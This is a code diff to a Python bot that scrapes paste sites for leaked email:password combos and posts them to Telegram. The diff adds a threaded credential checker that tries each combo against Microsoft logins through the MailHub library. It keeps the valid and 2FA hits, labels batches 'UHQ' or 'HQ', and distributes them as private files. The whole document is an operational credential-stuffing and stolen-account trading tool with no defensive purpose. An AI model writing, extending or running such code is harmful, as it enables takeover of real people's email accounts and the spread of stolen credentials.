@@ -15,6 +15,8 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 import aiohttp
+import concurrent.futures
+from mailhub import MailHub
 
 import discord
 from discord.ext import commands, tasks
@@ -30,6 +32,7 @@ TELEGRAM_PUBLIC_CHAT2 = os.environ["TELEGRAM_PUBLIC_CHAT2"]
 OWNER_ID           = int(os.environ["OWNER_ID"])
 
 CHECK_INTERVAL   = 30
+CHECKER_THREADS  = 50
 PAGES_TO_SCAN    = 5
 ARCHIVE_URL      = "https://pasteview.com/paste-archive"
 PASTEDPW_URL     = "https://pasted.pw/recent.php"
@@ -179,6 +182,56 @@ async def extract_raw(page, url: str) -> str:
                 await asyncio.sleep(2)
 
     return ""
+
+# ─── CHECKER ─────────────────────────────────────────────────────────────────
+def check_single(combo: str) -> tuple:
+    """Returns (combo, 'VALID'|'2FA'|'INVALID')"""
+    try:
+        email, password = combo.split(":", 1)
+        checker = MailHub()
+        for _ in range(3):
+            try:
+                r = checker.loginMICROSOFT(email, password, None)
+                if not r:
+                    return (combo, "INVALID")
+                if r[0] == "ok":
+                    return (combo, "VALID")
+                if r[0] == "nfa":
+                    return (combo, "2FA")
+                if r[0] == "retry":
+                    continue
+                return (combo, "INVALID")
+            except Exception:
+                import time; time.sleep(0.5)
+        return (combo, "INVALID")
+    except Exception:
+        return (combo, "INVALID")
+
+
+async def check_combos(combos: list, status_msg=None) -> tuple:
+    """Run combos through checker. Returns (valid_list, invalid_count)."""
+    if not combos:
+        return [], 0
+    log.info(f"Checking {len(combos)} combos with {CHECKER_THREADS} threads...")
+    if status_msg:
+        try:
+            await status_msg.edit(content=f"🔄 Checking {len(combos)} combos...")
+        except Exception:
+            pass
+    loop = asyncio.get_event_loop()
+    with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
+        futures = [loop.run_in_executor(pool, check_single, combo) for combo in combos]
+        results = await asyncio.gather(*futures)
+    valid   = [combo for combo, status in results if status in ("VALID", "2FA")]
+    invalid = sum(1 for combo, status in results if status == "INVALID")
+    log.info(f"Checking done — {len(valid)} valid / {invalid} invalid")
+    if status_msg:
+        try:
+            await status_msg.edit(content=f"✅ {len(valid)} valid / {invalid} invalid from {len(combos)} combos")
+        except Exception:
+            pass
+    return valid, invalid
+
 
 # ─── PASTED.PW ───────────────────────────────────────────────────────────────
 async def scrape_pastedpw(pages: int = 5) -> list[dict]:
@@ -401,7 +454,28 @@ async def monitor_loop():
                         else:
                             label = "content"
 
-                        # Split into random chunks of 0-1000 lines
+                        # Run checker for hotmail and hits only
+                        invalid_count = 0
+                        if label in ("hotmail", "hits"):
+                            try:
+                                status_msg = await bot.get_channel(
+                                    int(os.environ.get("CONTENT_CHANNEL_ID", "0")) or None
+                                ) and None or None
+                            except Exception:
+                                status_msg = None
+                            all_raw, invalid_count = await check_combos(all_raw, status_msg)
+                            if not all_raw:
+                                log.info("No valid hits after checking, skipping post")
+                                combined = []
+
+                        # Determine quality rating
+                        total_checked = len(all_raw) + invalid_count
+                        if total_checked > 0 and len(all_raw) > invalid_count:
+                            quality = "UHQ"
+                        else:
+                            quality = "HQ"
+
+                        # Split into random chunks of 100-1500 lines
                         chunks = []
                         remaining = all_raw[:]
                         while remaining:
@@ -409,14 +483,14 @@ async def monitor_loop():
                             chunks.append(remaining[:size])
                             remaining = remaining[size:]
 
-                        log.info(f"Split {len(all_raw)} combos into {len(chunks)} file(s)")
+                        log.info(f"Split {len(all_raw)} combos into {len(chunks)} file(s) [{quality}]")
 
                     if combined:
                         # DM owner
                         if toggles["owner_dm"]:
                             try:
                                 owner = await bot.fetch_user(OWNER_ID)
-                                await owner.send(f"✅ New {label.upper()} detected — {len(all_raw)} combos in {len(chunks)} file(s)")
+                                await owner.send(f"✅ New {label.upper()} [{quality}] detected — {len(all_raw)} combos in {len(chunks)} file(s)")
                             except Exception as e:
                                 log.error(f"Failed to DM owner: {e}")
 
@@ -430,7 +504,7 @@ async def monitor_loop():
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                             )
                             for chunk in chunks:
-                                fname = f"{len(chunk)} {label.upper()}.txt"
+                                fname = f"[ PVT ] [ {quality} ] [ {len(chunk)} ] [ {label.upper()} ].txt"
                                 await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                 await asyncio.sleep(0.5)
 
@@ -438,7 +512,7 @@ async def monitor_loop():
                                 private_post_count_ref = globals()
                                 private_post_count_ref["private_post_count"] += 1
                                 for chunk in chunks:
-                                    private_post_count_ref["recent_filenames"].append(f"{len(chunk)} {label.upper()}.txt")
+                                    private_post_count_ref["recent_filenames"].append(f"[ PVT ] [ {quality} ] [ {len(chunk)} ] [ {label.upper()} ].txt")
                                 log.info(f"Private post count: {private_post_count_ref['private_post_count']}")
                                 if private_post_count_ref["private_post_count"] >= 2:
                                     private_post_count_ref["private_post_count"] = 0
